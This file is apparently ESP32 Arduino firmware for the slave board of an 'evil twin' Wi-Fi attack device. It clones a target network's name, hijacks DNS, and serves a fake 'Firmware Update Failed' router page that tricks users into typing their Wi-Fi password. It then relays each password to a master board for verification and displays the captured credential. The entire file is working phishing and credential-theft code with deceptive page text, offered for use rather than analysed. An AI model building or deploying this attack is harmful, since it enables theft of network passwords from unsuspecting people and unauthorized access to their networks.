/*
This code is for the Slave - ESP32. Features:

 - answer for I2C requests to start evil twin (recieves BSSID & Name)
 - answer for I2C asks if user already provided a password to verify
 - accept info from RTL that password is OK - then stop Evil Twin

ESP's SDA (21) is connected to RTL PA26
ESP's SCL (22) is connected to RTL PA25

*/


#include <Arduino.h>
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>

#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>

#include "Wire.h"

#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
#define OLED_RESET 16
#define OLED_DC 17
#define OLED_CS 5

#define SLAVE_ADDRESS 8

Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &SPI, OLED_DC, OLED_RESET, OLED_CS);


const byte DNS_PORT = 53;
IPAddress apIP(172, 0, 0, 1);
DNSServer dnsServer;
WebServer webServer(80);

String _tryPassword = "";
String evilAPName = "";

int missionSuccessful = 0;



//////// HTML code
// Default main strings
#define SUBTITLE "ACCESS POINT RESCUE MODE"
#define TITLE "<warning style='text-shadow: 1px 1px black;color:yellow;font-size:7vw;'>&#9888;</warning> Firmware Update Failed"
#define BODY "Your router encountered a problem while automatically installing the latest firmware update.<br><br>To revert the old firmware and manually update later, please verify your password."

String header(String t) {
  String a = String(evilAPName);
  String CSS = "article { background: #f2f2f2; padding: 1.3em; }"
               "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
               "div { padding: 0.5em; }"
               "h1 { margin: 0.5em 0 0 0; padding: 0.5em; font-size:7vw;}"
               "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 1px solid #555555; border-radius: 10px; }"
               "label { color: #333; display: block; font-style: italic; font-weight: bold; }"
               "nav { background: #0066ff; color: #fff; display: block; font-size: 1.3em; padding: 1em; }"
               "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; } "
               "textarea { width: 100%; }";
  String h = "<!DOCTYPE html><html>"
             "<head><title>"
             + a + " :: " + t + "</title>"
                                "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
                                "<style>"
             + CSS + "</style>"
                     "<meta charset=\"UTF-8\"></head>"
                     "<body><nav><b>"
             + a + "</b> " + SUBTITLE + "</nav><div><h1>" + t + "</h1></div><div>";
  return h;
}

String footer() {
  return "</div><div class=q><a>&#169; All rights reserved.</a></div>";
}

String index() {
  return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action='/' method=post><label>WiFi password:</label>" + "<input type=password id='password' name='password' minlength='8'></input><input type=submit value=Continue></form>" + footer();
}

//pass password entered by the user to RTL
void answerRTLRequestForPassword() {

  if (_tryPassword.length() > 0) {
    Serial.print("\nAnswering request for password which is:");
    Serial.print(_tryPassword);
    char buffer[_tryPassword.length() + 2];
    strcpy(buffer, _tryPassword.c_str());
    buffer[_tryPassword.length()] = '\n';
    Serial.print("\nPassing password to RTL:");
    Serial.println(_tryPassword);
    delay(200);
    Wire.write(reinterpret_cast<const uint8_t*>(buffer), strlen(buffer));
  } else {
    //Serial.println("\nNo password yet to pass to RTL, passing empty end of line message");
    //delay(200);
    Wire.write(reinterpret_cast<const uint8_t*>("\n"), strlen("\n"));
  }
}


/*
Accepts:
#()^7841%_<EvilTwinNetworkName>
#()^7842%_BadPass
#()^7843%_GoodPass
*/
void acceptEvilTwinOrderOrFinishSignal(int numBytes) {

  String receivedData = "";

  while (Wire.available()) {
    char c = Wire.read();
    receivedData += c;
  }

  //Serial.print("Received string from RTL:");
  //Serial.print(receivedData);
  //delay(200);
  if (receivedData.equals("#()^7843%_GoodPass")) {
    //finalize evil twin, and show password on the screen:
    display.clearDisplay();
    display.setCursor(0, 0);
    display.print("AP: ");
    display.println(evilAPName);
    display.print("Pass: ");
    display.println(_tryPassword);
    display.display();

    missionSuccessful = 1;

    dnsServer.stop();
    WiFi.softAPdisconnect(true);
    WiFi.disconnect(true);
    WiFi.mode(WIFI_OFF);



  } else {
    if (receivedData.equals("#()^7842%_BadPass")) {

      missionSuccessful = 0;

      display.clearDisplay();
      display.setCursor(0, 0);
      display.print("AP: ");
      display.println(evilAPName);
      display.println("Failed on:");
      display.println(_tryPassword);
      display.display();

      _tryPassword = "";
    } else {
      //expect #()^7841%_<EvilTwinNetworkName>
      String startPattern = "#()^7841%_";
      int startIndex = receivedData.indexOf(startPattern);
      if (startIndex != -1) {
        startIndex += startPattern.length();
        String receivedEvilAPName = receivedData.substring(startIndex);
        //ok, do we have a new Evil AP to start?
        if (!evilAPName.equals(receivedEvilAPName)) {
          evilAPName = receivedEvilAPName;
          evilAPName += "\u200B"; //avoid iPhone grouping
          //start attack on evilAP
          Serial.print("Starting Evil Twin for: ");
          Serial.println(evilAPName);

          display.clearDisplay();
          display.setCursor(0, 0);
          display.println("Working on: ");
          display.println(evilAPName);
          display.display();

          //start main evil twin access point:

          WiFi.mode(WIFI_AP);
          WiFi.softAPConfig(IPAddress(172, 0, 0, 1), IPAddress(172, 0, 0, 1), IPAddress(255, 255, 255, 0));
          WiFi.softAP(evilAPName);
          dnsServer.start(DNS_PORT, "*", IPAddress(172, 0, 0, 1));
          WiFi.disconnect();

          webServer.on("/", handleIndex);
          webServer.on("/result", handleResult);
          webServer.onNotFound(handleIndex);
          webServer.begin();
        }

      } else {
        //FAILED to parse, print communication error
        Serial.print("Communication error: ");
        Serial.println(receivedData);
      }
    }
  }
}


void setup() {
  Serial.begin(115200);
  //pinMode(LED_BUILTIN, OUTPUT);
  Wire.begin(SLAVE_ADDRESS);
  Wire.onReceive(acceptEvilTwinOrderOrFinishSignal);
  Wire.onRequest(answerRTLRequestForPassword);

  pinMode(OLED_RESET, OUTPUT);
  digitalWrite(OLED_RESET, HIGH);
  display.begin(SSD1306_SWITCHCAPVCC);
  display.display();
  delay(100);
  display.clearDisplay();

  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, 0);
  display.println("Connect to: ROUTER");
  display.println("Password: eviltwin");  //hardcoded data from master
  display.println("Visit: 192.168.1.1");
  display.display();
  delay(100);

}

void handleResult() {
  String html = "";
  if (missionSuccessful == 0) {

    webServer.send(200, "text/html", "<html><head><script> setTimeout(function(){window.location.href = '/';}, 10000); </script><meta name='viewport' content='initial-scale=1.0, width=device-width'><body><center><h2><wrong style='text-shadow: 1px 1px black;color:red;font-size:60px;width:60px;height:60px'>&#8855;</wrong><br>Wrong Password</h2><p>Please, try again.</p></center></body> </html>");
    Serial.println("Handle result called when missionSuccessful==0...");

    display.clearDisplay();
    display.setCursor(0, 0);
    display.println("AP: ");
    display.println(evilAPName);
    display.println("Wrong pass entered: ");
    display.println(_tryPassword);

    display.display();
  }
}

void handleIndex() {
  if (webServer.hasArg("password")) {
    _tryPassword = webServer.arg("password");
    //ESP32 will be passively asked for password by RTL

    display.clearDisplay();
    display.setCursor(0, 0);
    display.println("Trying password: ");
    display.println(_tryPassword);
    display.display();

    webServer.send(200, "text/html", "<!DOCTYPE html> <html><script> setTimeout(function(){window.location.href = '/result';}, 45000); </script></head><body><center><h2 style='font-size:7vw'>Verifying integrity, please wait up to 1 minute...<br><progress value='10' max='100'>10%</progress></h2></center></body> </html>");
  } else {
    webServer.send(200, "text/html", index());
  }
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
}
